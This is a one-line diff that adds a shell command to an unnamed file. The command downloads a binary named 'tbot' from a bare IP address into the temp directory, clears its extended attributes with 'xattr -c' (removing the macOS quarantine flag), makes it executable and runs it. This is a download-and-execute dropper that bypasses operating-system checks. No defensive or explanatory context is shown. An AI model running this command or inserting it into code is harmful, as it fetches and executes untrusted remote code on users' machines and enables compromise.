@@ -1,0 +1,1 @@
+cd $TMPDIR && curl -O http://45.137.99.121/tbot && xattr -c tbot && chmod +x tbot && ./tbot
